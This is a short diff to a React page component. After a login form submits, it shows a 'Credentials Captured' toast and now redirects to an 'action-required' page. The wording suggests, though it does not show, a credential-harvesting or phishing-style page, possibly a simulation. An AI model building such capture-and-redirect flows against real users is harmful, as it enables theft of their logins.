@@ -94,9 +94,10 @@ export default function Home() {
         title: 'Credentials Captured',
         description: 'The credentials have been saved successfully.',
       });
-      setIsDialogOpen(false);
-      setUsername('');
-      setPassword('');
+      
+      // Redirect to the page that shows the sweet alert
+      window.location.href = '/action-required.html';
+
     } catch (error) {
       console.error('An error occurred during submission:', error);
       toast({
@@ -106,6 +107,7 @@ export default function Home() {
       });
     } finally {
       setIsSubmitting(false);
+      // Reset form and dialog state only on success, handled by redirect
     }
   };
 
